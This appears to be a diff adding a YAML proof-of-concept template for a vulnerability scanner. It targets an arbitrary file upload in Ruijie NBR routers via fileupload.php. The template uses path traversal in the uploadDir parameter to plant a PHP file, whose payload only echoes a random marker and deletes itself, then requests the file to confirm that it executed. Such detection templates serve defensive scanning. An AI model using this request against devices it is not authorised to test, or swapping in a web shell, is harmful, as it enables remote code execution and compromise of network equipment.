@@ -1,0 +1,34 @@
+name: poc-yaml-ruijie-nbr-fileuploadphp-fileupload
+transport: http
+set:
+  s1: randomLowercase(8)
+  s2: randomLowercase(8)
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /ddi/server/fileupload.php?uploadDir=../../&name={{s2}}.php
+      follow_redirects: false
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: "\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"file\"; filename=\"{{s2}}.php\"\r\n\
+        Content-Type: image/jpeg\r\n\
+        \r\n\
+        <?php echo \"{{s1}}\"; unlink(__FILE__); ?>\r\n\
+        ------WebKitFormBoundary{{rboundary}}--\r\n\
+        "
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /{{s2}}.php
+      follow_redirects: false
+    expression: response.status == 200 && response.body_string.contains(s1)
+expression: r0() && r1()
+detail:
+  author: 2husky
+  links:
+    - https://mp.weixin.qq.com/s/-ZWi_Et7FUv9SYigk-g3LQ
